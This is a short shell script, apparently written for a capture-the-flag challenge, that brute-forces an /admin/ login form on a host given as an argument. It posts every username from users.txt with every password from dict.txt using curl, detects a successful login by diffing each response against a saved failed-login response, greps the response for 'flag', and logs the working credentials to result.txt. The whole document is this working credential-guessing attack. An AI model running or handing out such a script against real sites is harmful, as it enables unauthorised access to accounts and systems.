#!/bin/sh
url="http://$1/admin/"
curl -s -X POST "$url" -d "username=qsdqsdq&password=qsdqsd&Login=Login" > trueone
while IFS='' read -r user; do
	echo "try user : $user"
	while IFS='' read -r line; do
		echo "\ttry password: $line"
		curl -s "$url" -d "username=$user&password=$line&Login=Login"> tested
		DIFF=$(diff trueone tested)
		if [ "$DIFF" != "" ]
		then
			cat tested | grep "flag"
			echo "user is : $user\npassword is $line" >> result.txt
			rm tested
			break
		fi
		rm tested
	done < "dict.txt"
done < "users.txt"